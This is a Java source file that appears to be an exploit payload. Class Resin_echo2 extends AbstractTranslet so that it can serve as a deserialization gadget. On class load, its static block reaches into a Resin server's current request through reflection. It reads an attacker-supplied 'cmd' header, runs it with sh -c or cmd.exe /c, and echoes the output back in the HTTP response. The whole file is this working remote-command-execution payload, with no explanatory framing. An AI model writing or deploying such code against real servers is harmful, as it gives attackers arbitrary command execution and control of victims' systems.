package com.exp;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.Serializable;
import java.io.Writer;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Scanner;

//TcpSocketLink
public class Resin_echo2 extends AbstractTranslet implements Serializable {
    static {
        try {
            Class tcpSocketLinkClazz = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.network.listen.TcpSocketLink");
            Method getCurrentRequestM = tcpSocketLinkClazz.getMethod("getCurrentRequest");
            Object currentRequest = getCurrentRequestM.invoke(null);
            Field f = currentRequest.getClass().getSuperclass().getDeclaredField("_responseFacade");
            f.setAccessible(true);
            Object response = f.get(currentRequest);
            Method getWriterM = response.getClass().getMethod("getWriter");
            Writer writer = (Writer) getWriterM.invoke(response);
            Method getHeaderM = currentRequest.getClass().getMethod("getHeader", String.class);
            String cmd = (String) getHeaderM.invoke(currentRequest, "cmd");
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            Scanner scanner = (new Scanner(Runtime.getRuntime().exec(cmds).getInputStream())).useDelimiter("\\A");
            writer.write(scanner.hasNext() ? scanner.next() : "");
    }catch (Exception e) {
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
